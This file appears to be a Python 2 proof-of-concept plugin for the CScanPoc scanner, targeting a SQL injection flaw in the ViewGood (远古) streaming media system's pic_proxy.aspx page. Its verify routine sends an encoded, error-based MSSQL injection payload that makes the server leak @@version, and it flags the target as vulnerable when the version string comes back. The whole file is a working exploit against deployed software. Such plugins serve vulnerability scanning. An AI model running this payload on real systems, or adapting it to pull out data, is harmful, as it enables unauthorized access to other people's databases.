# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'VIEWGOOD_0003' # 平台漏洞编号，留空
    name = '远古流媒体系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-01-14'  # 漏洞公布时间
    desc = '''
        远古流媒体系统 /viewgood/webmedia/portal/pic_proxy.aspx?id=1 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=146420
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '远古流媒体系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e7c3c785-4988-40e3-8eda-739a8fc25353'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload ='/viewgood/webmedia/portal/pic_proxy.aspx?id=1%20and%201%3Dconvert%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29--&type=2'
            target = arg + payload 
            code, head, res, errcode, _ = hh.http(target)
            if code == 500 and 'tyqMicrosoft SQL Server' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()